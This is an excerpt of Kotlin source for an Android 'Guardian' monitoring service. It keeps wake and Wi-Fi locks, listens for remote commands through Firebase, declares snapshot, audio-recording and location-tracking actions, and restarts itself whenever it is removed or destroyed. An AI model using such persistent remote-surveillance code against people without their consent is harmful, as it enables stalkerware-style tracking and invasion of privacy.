            Log.e(TAG, "Ringtone trigger error: ${e.message}")
        }
    }

    private fun showHighPriorityParentMessageNotification(text: String) {
        // Push to Firestore for web UI
        val deviceId = statusProvider.getDeviceId()
        notificationManager.pushGuardianMessageNotification(deviceId, text)

        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? AndroidNotificationManager
        val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)

        val chatIntent = Intent(this, com.nexus.androkiller.ui.chat.ChatOverlayActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("auto_open", true)
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            2003,
            chatIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notif = NotificationCompat.Builder(this, CHANNEL_ID_ALERTS)
            .setContentTitle("Guardian Priority Alert")
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setDefaults(NotificationCompat.DEFAULT_ALL)
            .setSound(soundUri)
            .setVibrate(longArrayOf(0, 300, 200, 300))
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()
        manager?.notify(2002, notif)
    }

    private fun stopServiceInternal() {
        isServiceRunning = false
        locationTracker.stopTracking()
        locationCollectorJob?.cancel()
        heartbeatJob?.cancel()
        commandListener?.remove()
        commandListener = null
        unregisterNetworkCallback()

        val deviceId = statusProvider.getDeviceId()
        serviceScope.launch {
            val status = statusProvider.getSystemStatus(monitoringActive = false, intervalSeconds = trackingIntervalSeconds)
            repository.updateSystemStatus(status.copy(isOnline = false, monitoringActive = false))
            repository.pushLog(
                UsageLog(
                    deviceId = deviceId,
                    eventType = "SERVICE_STOP",
                    message = "Foreground tracking service stopped",
                    level = "INFO"
                )
            )
        }

        releaseWakeLock()
        releaseWifiLock()

        // Stop notification listeners
        notificationManager.stopListening()
    }

    @Synchronized
    private fun ensureCommandListenerActive(deviceId: String) {
        if (commandListener == null) {
            Log.i(TAG, "Subscribing/resubscribing command listener for $deviceId...")
            commandListener = repository.subscribeToCommands(
                deviceId = deviceId,
                onError = { error ->
                    Log.w(TAG, "Command listener error: ${error.message}. Will re-subscribe on next heartbeat.")
                    commandListener = null
                }
            ) { command ->
                handleRemoteCommand(command)
            }
        }
    }

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            connectivityCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "Network connection active. Refreshing Firebase bridge...")
                    serviceScope.launch {
                        delay(1200L)
                        val devId = statusProvider.getDeviceId()
                        commandListener?.remove()
                        commandListener = null
                        ensureCommandListenerActive(devId)
                        val status = statusProvider.getSystemStatus(true, trackingIntervalSeconds)
                        repository.updateSystemStatus(status)
                    }
                }
            }
            cm.registerNetworkCallback(request, connectivityCallback!!)
        } catch (e: Exception) {
            Log.w(TAG, "Network callback warning: ${e.message}")
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            connectivityCallback?.let {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                cm?.unregisterNetworkCallback(it)
            }
        } catch (_: Exception) {}
        connectivityCallback = null
    }

    private fun buildServiceNotification(contentText: String): Notification {
        val launchIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Nexus Connection Online")
            .setContentText(contentText)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun updateNotificationText(text: String) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? AndroidNotificationManager
        manager?.notify(NOTIFICATION_ID, buildServiceNotification(text))
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(AndroidNotificationManager::class.java) ?: return

            // 1. High-priority pinned persistent notification channel
            val fgChannel = NotificationChannel(
                CHANNEL_ID,
                "Nexus Persistent Service",
                AndroidNotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Maintains persistent background telemetry and real-time remote commands bridge"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            }
            manager.createNotificationChannel(fgChannel)

            // 2. High-priority channel with audible sound and vibration for alerts and messages
            val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
            val audioAttributes = AudioAttributes.Builder()
                .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                .setUsage(AudioAttributes.USAGE_NOTIFICATION_COMMUNICATION_INSTANT)
                .build()

            val alertChannel = NotificationChannel(
                CHANNEL_ID_ALERTS,
                "Guardian Alerts & Calls",
                AndroidNotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Audible notifications for incoming Guardian alerts and calls"
                setSound(soundUri, audioAttributes)
                enableVibration(true)
                vibrationPattern = longArrayOf(0, 300, 200, 300)
                enableLights(true)
                setShowBadge(true)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            }
            manager.createNotificationChannel(alertChannel)
        }
    }

    private fun acquireWakeLock() {
        try {
            if (wakeLock == null) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
                wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "$TAG:PersistentWakeLock")?.apply {
                    setReferenceCounted(false)
                }
            }
            if (wakeLock?.isHeld != true) {
                wakeLock?.acquire()
                Log.i(TAG, "Persistent background WakeLock held.")
            }
        } catch (e: Exception) {
            Log.w(TAG, "WakeLock acquisition warning: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
        wakeLock = null
    }

    private fun acquireWifiLock() {
        try {
            if (wifiLock == null) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                @Suppress("DEPRECATION")
                wifiLock = wifiManager?.createWifiLock(
                    WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                    "$TAG:PersistentWifiLock"
                )?.apply {
                    setReferenceCounted(false)
                }
            }
            if (wifiLock?.isHeld != true) {
                wifiLock?.acquire()
                Log.i(TAG, "Persistent WifiLock held.")
            }
        } catch (e: Exception) {
            Log.w(TAG, "WifiLock acquisition warning: ${e.message}")
        }
    }

    private fun releaseWifiLock() {
        try {
            if (wifiLock?.isHeld == true) {
                wifiLock?.release()
            }
        } catch (_: Exception) {}
        wifiLock = null
    }

    private fun getMimeTypeForFilename(name: String): String {
        return when (name.substringAfterLast('.', "").lowercase()) {
            "apk" -> "application/vnd.android.package-archive"
            "zip" -> "application/zip"
            "rar" -> "application/x-rar-compressed"
            "gz", "tgz" -> "application/gzip"
            "pdf" -> "application/pdf"
            "json" -> "application/json"
            "txt", "log", "env", "css", "ts", "js" -> "text/plain"
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "webp" -> "image/webp"
            "mp4" -> "video/mp4"
            "m4a", "aac" -> "audio/mp4"
            "mp3" -> "audio/mpeg"
            "wav" -> "audio/wav"
            else -> "application/octet-stream"
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "onTaskRemoved triggered: auto-resurrecting persistent foreground service via BootReceiver.")
        try {
            BootReceiver.scheduleNextKeepaliveAlarm(applicationContext, 500L)
        } catch (e: Exception) {
            Log.e(TAG, "Error in onTaskRemoved resurrection: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "TrackerForegroundService destroyed. Auto-resurrecting...")
        stopServiceInternal()
        serviceScope.cancel()

        try {
            BootReceiver.scheduleNextKeepaliveAlarm(applicationContext, 800L)
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "TrackerService"
        const val CHANNEL_ID = "tracker_foreground_channel"
        const val CHANNEL_ID_ALERTS = "tracker_alerts_channel_v2"
        const val NOTIFICATION_ID = 1001

        const val ACTION_START_TRACKING = "com.nexus.androkiller.START_TRACKING"
        const val ACTION_STOP_TRACKING = "com.nexus.androkiller.STOP_TRACKING"
        const val ACTION_TAKE_SNAPSHOT = "com.nexus.androkiller.TAKE_SNAPSHOT"
        const val ACTION_RECORD_AUDIO = "com.nexus.androkiller.RECORD_AUDIO"

        const val EXTRA_INTERVAL_SECONDS = "interval_seconds"
        const val EXTRA_DURATION_SECONDS = "duration_seconds"

        var isServiceRunning = false
            private set
    }
}
